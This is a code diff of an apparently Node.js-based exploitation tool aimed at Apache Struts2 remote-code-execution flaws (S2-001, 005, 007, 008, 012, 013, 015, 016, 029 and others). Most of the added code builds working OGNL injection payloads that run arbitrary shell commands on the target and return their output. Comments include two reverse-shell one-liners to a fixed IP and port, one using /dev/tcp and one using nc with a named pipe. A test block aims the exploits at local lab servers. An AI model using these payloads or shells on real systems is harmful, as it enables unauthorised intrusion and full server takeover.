@@ -358,40 +358,7 @@ function doStruts2_048(url,fnCbk)
     });
 }
 
-// /robots.txt
 
-// http://gdsw.lss.gov.cn/swwssb/userRegisterAction.do?redirect:http://webscan.360.cn
-// s2_016,s2_017
-function doStruts2_016(url)
-{
-	/*///////////
-	var szCode = ("%{(#nike='multipart/form-data')"
-		+ ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
-		+ ".(#_memberAccess?(#_memberAccess=#dm):" 
-			+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
-			+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
-			+ ".(#ognlUtil.getExcludedPackageNames().clear())"
-		+ ".(#ognlUtil.getExcludedClasses().clear())"
-		+ ".(#context.setMemberAccess(#dm))))"
-		+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
-		+ ".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))"
-		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
-		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
-		+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse()"
-		+ ".getOutputStream()))"
-		+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
-		+ ".(#ros.flush()).(#ros.close())}");
-	////////////////////////*/
-	request(fnOptHeader({method: 'GET',encoding: null,uri: url + "?redirect:" + encodeURIComponent(g_postData)
-		}), 
-    	function(e,r,b)
-    {
-    	// console.log(b.toString());
-    	// if(-1 < b.indexOf("administrator"))console.log(b.toString("gbk"));
-    	if(!e)fnDoBody(b,"s2-016");
-    	// console.log(e || b || r);
-    });
-}
 
 function myLog(a)
 {
@@ -535,10 +502,18 @@ function fnNotEnd(url)
 function doStruts2_001(url)
 {
 	url = fnNotEnd(url);
-	var szM = g_szCmd;//.replace(/;/gmi, " && ");
-	var s = ('%{#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + szM + '\'}:{\'/bin/bash\',\'-c\',\'' + szM + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
-		+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#wt.flush()'
+	var s = ('%{#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
+		+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]'
+		+ ',#wt=#f.getWriter()'
+		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
+		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
+		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
+		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
+		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
+		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
+		+ ',#wt.flush()'
 		+',#wt.close()}');
+
 	request(({method: 'POST',uri: url 
 		,body:"username=" + encodeURIComponent(s) + "&password="
 		,headers:
@@ -555,7 +530,20 @@ function doStruts2_001(url)
 
 function doStruts2_005(url, fnCbk)
 {
-	var ss = g_postData.replace(/#/gmi, "\\u0023");
+	url = fnNotEnd(url);
+	var s = ('%{#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
+		+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]'
+		+ ',#wt=#f.getWriter()'
+		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
+		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
+		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
+		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
+		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
+		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
+		// + ',#wt.flush()'
+		// +',#wt.close()'
+		+'}');
+	var ss = s.replace(/#/gmi, "\u0023");
 	ss = encodeURIComponent(ss);
 	request(fnOptHeader({method: 'GET',uri: url + "?" + ss + "=1"
 	    ,headers:
@@ -566,6 +554,7 @@ function doStruts2_005(url, fnCbk)
 	  , function (error, response, body){
 	  		if(body)
 	  		{
+	  			console.log(body);
 	  			fnDoBody(body,"s2-005");
 	  		}
 	    }
@@ -607,31 +596,50 @@ function doStruts2_019(url, fnCbk,bW)
 	if(!bW)doStruts2_019(url,null,true);
 }
 
-function doStruts2_029(url, fnCbk)
+/*
+(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()))
+*/
+function doStruts2_029(url, fnCbk,bW)
 {
-	var s1 = encodeURIComponent(szDPt),s = 
+	var s1 = (g_postData),s = 
 		// s-045不允许下面的代码
-		".(#_memberAccess['allowStaticMethodAccess']=true)"
-		+ ".(#_memberAccess['acceptProperties']=true)"
-		+ ".(#_memberAccess['excludedPackageNamePatterns']=true)"
-		+ ".(#_memberAccess['excludedPackageNamePatterns']=true)"
-		+ ".(#_memberAccess['excludedClasses']=true)"
+		
+		+ "(#_memberAccess['allowPrivateAccess']=true)"
+		+ ",(#_memberAccess['allowStaticMethodAccess']=true)"
+		+ ",(#_memberAccess['acceptProperties']=true)"
+		+ ",(#_memberAccess['excludedPackageNamePatterns']=true)"
+		+ ",(#_memberAccess['excludedPackageNamePatterns']=true)"
+		+ ",(#_memberAccess['excludedClasses']=true)"
 		// s2-048不能加下面的代码
-		+ ".(#_memberAccess['allowPrivateAccess']=true)"
+		
 		+ ".(#_memberAccess['allowProtectedAccess']=true)"
 		+ ".(#_memberAccess['acceptProperties']=true)"
-		+ ".(#_memberAccess['allowPackageProtectedAccess']=true)",
-		szDPt = g_postData.replace(/\.\(#rplc=true\)/, s);
+		+ ".(#_memberAccess['allowPackageProtectedAccess']=true)"
+		,szDPt = g_postData.replace(/\.\(#rplc=true\)/, s);
 
-	request(fnOptHeader({method: 'POST',uri: url + "?message=" + s1,
-		"formData":{"message":s1}
+		s = "(" + s + ",#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
+		+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
+		+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
+		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
+		+ ",#as=new java.lang.String()"
+		+ ",#p.redirectErrorStream(true),#process=#p.start()"
+		+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
+		+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+		+")";
+
+	request(fnOptHeader({method: 'POST',uri: url + "?message=" + encodeURIComponent(s)
+		//*
+		,"formData":{"message":s}
 	    ,headers:
 	    {
 	    	"User-Agent": g_szUa,
 	    	"Content-Type":"application/x-www-form-urlencoded"
-	    }})
+	    }//*/
+		})
 	  , function (error, response, body){
-	  		// console.log(error || body);
+	  		console.log(error || body);
 	  		if(body)
 	  		{
 	  			fnDoBody(body,"s2-029");
@@ -862,103 +870,28 @@ function doStruts2_009(url, fnCbk)
 	  );
 }
 /*
-Struts2 标签中 <s:a> 和 <s:url> 都包含一个 includeParams 属性，其值可设置为 none，
-get 或 all，参考官方其对应意义如下：
-none - 链接不包含请求的任意参数值（默认）
-get - 链接只包含 GET 请求中的参数和其值
-all - 链接包含 GET 和 POST 所有参数和其值
-<s:a>用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。
-   在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。
-*/
-function doStruts2_013(url, fnCbk)
-{
-	request(fnOptHeader({method: 'GET',uri: url + "?a=" + encodeURIComponent(g_postData)
-	    ,headers:
-	    {
-	    	"User-Agent": g_szUa,
-	    	"Content-Type":"application/x-www-form-urlencoded"
-	    }})
-	  , function (error, response, body){
-	  		if(body)
-	  		{
-	  			fnDoBody(body,"s2-013,s2-014");
-	  		}
-	    }
-	  );
-	request(fnOptHeader({method: 'POST',uri: url + "?a=" + encodeURIComponent(g_postData),
-		"formData":{"z": encodeURIComponent(g_postData)}
-	    ,headers:
-	    {
-	    	"User-Agent": g_szUa,
-	    	"Content-Type":"application/x-www-form-urlencoded"
-	    }})
-	  , function (error, response, body){
-	  		if(body)
-	  		{
-	  			fnDoBody(body,"s2-013,s2-014");
-	  		}
-	    }
-	  );
-}
-
-function doStruts2_015(url, fnCbk)
-{
-	request(fnOptHeader({method: 'GET',uri: url + "/" + encodeURIComponent(g_postData) + ".do"
-	    ,headers:
-	    {
-	    	"User-Agent": g_szUa,
-	    	"Content-Type":"application/x-www-form-urlencoded"
-	    }})
-	  , function (error, response, body){
-	  		if(body)
-	  		{
-	  			fnDoBody(body,"s2-015");
-	  		}
-	    }
-	  );
-}
-
-function doStruts2_007(url, fnCbk)
-{
-	request(fnOptHeader({method: 'POST',uri: url,
-		"formData":{"z": "' + "+ encodeURIComponent(g_postData) + " + '"}
-	    ,headers:
-	    {
-	    	"User-Agent": g_szUa,
-	    	"Content-Type":"application/x-www-form-urlencoded"
-	    }})
-	  , function (error, response, body){
-	  		if(body)
-	  		{
-	  			fnDoBody(body,"s2-007");
-	  		}
-	    }
-	  );
-}
-
-function doStruts2_008(url, fnCbk)
-{
-	request(fnOptHeader({method: 'POST',uri: url + "?debug=command&expression=" + encodeURIComponent(g_postData)
-	    ,headers:
-	    {
-	    	"User-Agent": g_szUa,
-	    	"Content-Type":"application/x-www-form-urlencoded"
-	    }})
-	  , function (error, response, body){
-	  		if(body)
-	  		{
-	  			fnDoBody(body,"s2-008");
-	  		}
-	    }
-	  );
-}
-/*
 如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量
 <result name="redirect" type="redirect">/index.jsp?name=${name}</result>
 */
 function doStruts2_012(url, fnCbk)
 {
-	request(fnOptHeader({method: 'POST',uri: url + "?ret_url=${" + g_postData + "}&name=${" + g_postData + "}"
+	var s = "%{#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
+	+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
+	+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
+	+ ",#p=new java.lang.ProcessBuilder(#cmds)"
+	+ ",#as=new java.lang.String()"
+	+ ",#p.redirectErrorStream(true),#process=#p.start()"
+	+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
+	+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+	+ ",#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()"
+	+ ",#f.println(#as)"
+	+ ",#f.flush()"
+	+ ",#f.close()"
+	+"}";
+	request(fnOptHeader({method: 'POST',uri: url
+	    ,"formData":{name:(s)}
 	    ,headers:
 	    {
 	    	"User-Agent": g_szUa,
@@ -972,6 +905,222 @@ function doStruts2_012(url, fnCbk)
 	    }
 	  );
 }
+/*
+Struts2 标签中 <s:a> 和 <s:url> 都包含一个 includeParams 属性，其值可设置为 none，
+get 或 all，参考官方其对应意义如下：
+none - 链接不包含请求的任意参数值（默认）
+get - 链接只包含 GET 请求中的参数和其值
+all - 链接包含 GET 和 POST 所有参数和其值
+<s:a>用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。
+   在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。
+*/
+function doStruts2_013(url, fnCbk)
+{
+	// encodeURIComponent(g_postData)
+	var s = "%{#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
+	+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
+	+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
+	+ ",#p=new java.lang.ProcessBuilder(#cmds)"
+	+ ",#as=new java.lang.String()"
+	+ ",#p.redirectErrorStream(true),#process=#p.start()"
+	+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
+	+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+	+ ",#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()"
+	+ ",#f.println(#as)"
+	+ ",#f.flush()"
+	+ ",#f.close()"
+	+"}";
+	request(fnOptHeader({method: 'GET',uri: url + "?a=" + encodeURIComponent(s)
+	    })
+	  , function (error, response, body){
+	  		if(body)
+	  		{
+	  			fnDoBody(body,"s2-013,s2-014");
+	  		}
+	    }
+	  );
+	request(fnOptHeader({method: 'POST',uri: url,
+		"formData":{"xt": s}
+	    ,headers:
+	    {
+	    	"User-Agent": g_szUa,
+	    	"Content-Type":"application/x-www-form-urlencoded"
+	    }})
+	  , function (error, response, body){
+	  		if(body)
+	  		{
+	  			fnDoBody(body,"s2-013,s2-014");
+	  		}
+	    }
+	  );
+}
+
+/*
+/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}.action
+*/
+function doStruts2_015(url, fnCbk)
+{
+	var fnC = function(szCmd,fnCbk1)
+	{
+		var s = "${#context['xwork.MethodAccessor.denyMethodExecution']=false"
+		//////// 增加的关键行 start//////
+		+ ",#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')"
+		+ ",#f.setAccessible(true)"
+		+ ",#f.set(#_memberAccess,true)"
+		//////// 增加的关键行 end//////
+		// + ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
+		// + ',#cmds=(#iswin?{"cmd.exe","/c","' + g_szCmdW + '"}:{"/bin/bash","-c","' + g_szCmd + '"})'
+		+ ",#p=new java.lang.ProcessBuilder('"+szCmd+"')"
+		+ ",#as=new java.lang.String()"
+		+ ",#p.redirectErrorStream(true),#process=#p.start()"
+		+ ",#c=new java.io.InputStreamReader(#process.getInputStream()),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
+		+ ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
+		// + ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+		// + ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+		+ ",#as='{{'+#as+'}}'"
+		+ ",#as.toString()"
+		+"}";
+		request(fnOptHeader({method: 'GET',uri: url + encodeURIComponent(s) + ".action"
+		    })
+		  , function (error, response, body){
+		  	//console.log(error||body);
+		  		if(body)
+		  		{
+		  			var r = /\{\{([^\}]+)\}\}/gmi.exec(body),sR = r && r[1] || "";
+		  			fnCbk1(szCmd + '\n' + sR.replace(/(^\s*)|(\s*$)/gmi,''));
+		  			// fnDoBody(body,"s2-015");
+		  		}else fnCbk1(szCmd + '\n');
+		    }
+		  );
+	};
+	var a = g_szCmd.split(";"),aR = [],nC = 0;
+	for(var i = 0; i < a.length; i++)
+	{
+		if(-1 < a[i].indexOf("echo")){nC++;continue;}
+		(function(n)
+		{
+			fnC(a[n],function(s)
+			{
+				aR[n] = s;
+				nC++;
+			})
+		})(i);
+	}
+	var nT = setInterval(function()
+	{
+		if(nC == a.length)
+		{
+			clearInterval(nT);
+			fnDoBody(aR.join("\n"),"s2-015");
+		}
+	},13);
+}
+
+// /robots.txt
+/*
+ "action:", "redirect:", "redirectAction:" 
+/default.action?redirect:
+${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
+// bash -i >& /dev/tcp/192.168.24.90/4444 0>&1
+// s2_016,s2_017
+//////////*/
+function doStruts2_016(url)
+{
+	url = fnNotEnd(url);
+	var s = "${#context['xwork.MethodAccessor.denyMethodExecution']=false"
+		//////// 增加的关键行 start//////
+		+ ",#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')"
+		+ ",#f.setAccessible(true)"
+		+ ",#f.set(#_memberAccess,true)"
+		//////// 增加的关键行 end//////
+		+ ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
+		+ ',#cmds=(#iswin?{"cmd.exe","/c","' + g_szCmdW + '"}:{"/bin/bash","-c","' + g_szCmd + '"})'
+		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
+		+ ",#p.redirectErrorStream(true),#process=#p.start()"
+		+ ",#c=new java.io.InputStreamReader(#process.getInputStream()),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
+		+ ",#i=#d.read(#e),#as=new java.lang.String(#e,0,#i)" 
+		// + ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
+		// + ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
+		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+		//+ ",#as=(@java.net.URLEncoder@encode(#as,'UTF-8'))"
+		// + ",#as='{{'+#as+'}}'"
+		+ ",#as.toString()"
+		+"}";
+	var oR = fnOptHeader({method: 'GET',uri: url + "?redirectAction:" + encodeURIComponent(s)
+		});
+	oR.followAllRedirects = oR.followRedirect=true;
+	request(oR,
+    	function(e,r1,b)
+    {
+    	// var r = /\{\{([^\}]+)\}\}/gmi.exec(b.toString()),sR = r && r[1] || "";
+    	// console.log(e || b);
+    	if(!e)fnDoBody(e||b,"s2-016");
+    });
+}
+
+/*
+一行反弹shell:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.24.90 4444 >/tmp/f
+*/
+function doStruts2_007(url, fnCbk)
+{
+	var s = "'+(#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
+		+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
+		+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
+		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
+		+ ",#as=new java.lang.String()"
+		+ ",#p.redirectErrorStream(true),#process=#p.start()"
+		+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
+		+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+		+")+'";
+
+	request(fnOptHeader({method: 'POST',uri: url,//  + "?name=1&email=1&age=" + encodeURIComponent(s)
+		"formData":{name:1,email:1,"age": (s)}
+	    ,headers:
+	    {
+	    	"User-Agent": g_szUa,
+	    	"Content-Type":"application/x-www-form-urlencoded"
+	    }})
+	  , function (error, response, body){
+	  		if(body)
+	  		{
+	  			body = body.replace(/\u0000/gmi, '');
+	  			// console.log(body);
+	  			fnDoBody(body,"s2-007");
+	  		}
+	    }
+	  );
+}
+
+function doStruts2_008(url, fnCbk)
+{
+	var s = "(#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
+	+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
+	+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
+	+ ",#p=new java.lang.ProcessBuilder(#cmds)"
+	+ ",#as=new java.lang.String()"
+	+ ",#p.redirectErrorStream(true),#process=#p.start()"
+	+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
+	+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
+	+")";
+	request(fnOptHeader({method: 'GET',uri: url + "?debug=command&expression=" + encodeURIComponent(s)
+	    })
+	  , function (error, response, body){
+	  		if(body)
+	  		{
+	  			fnDoBody(body,"s2-008");
+	  		}
+	    }
+	  );
+}
+
 // Tomcat 8下导致RCE
 function doStruts2_020(url, fnCbk)
 {
@@ -1171,13 +1320,39 @@ process.on('exit', (code) =>
 
 if(program.test)
 {
+	// doStruts2_016("http://192.168.10.216:8088/S2-016/default.action");
+ 	// doStruts2_029("http://192.168.10.216:8088/S2-029/");
+	// doStruts2_005("http://192.168.10.216:8088/S2-005/example/HelloWorld.action");
+	
+	// doStruts2_032("http://192.168.10.216:8088/s2-032/login.jsp");
+	
+	/**
+	doStruts2_009(g_szUrl);
+	
+	// doStruts2_020(g_szUrl);
+	doStruts2_029(g_szUrl);
+	doStruts2_032(g_szUrl);
+	doStruts2_033(g_szUrl);
+	doStruts2_037(g_szUrl);
+	doStruts2_DevMode(g_szUrl);
+	doStruts2_045(g_szUrl);
+	// 文件上传测试
+	doStruts2_046(g_szUrl);
+	doStruts2_048(g_szUrl);
+	//*/
+	//*
 	doStruts2_001("http://192.168.10.216:8088/S2-001/login.action");
+	doStruts2_007("http://192.168.10.216:8088/S2-007/user.action");
+	doStruts2_008("http://192.168.10.216:8088/S2-008/devmode.action");
+	doStruts2_012("http://192.168.10.216:8088/S2-012/user.action");
+	doStruts2_013("http://192.168.10.216:8088/S2-013/link.action");
+	doStruts2_015("http://192.168.10.216:8088/S2-015/");
+	doStruts2_016("http://192.168.10.216:8088/S2-016/default.action");
 	doStruts2_019("http://192.168.10.216:8088/S2-019/example/HelloWorld.action");
 	
-	doStruts2_029("http://192.168.10.216:8082/S2-029/login.jsp");
-	doStruts2_032("http://192.168.10.216:8082/s2-032/login.jsp");
 	doStruts2_046("http://192.168.10.216:8082/s2-046/");
 	doStruts2_048("http://192.168.10.216:8082/s2-048/integration/saveGangster.action");
+	///////////*/
 }
 
 /*
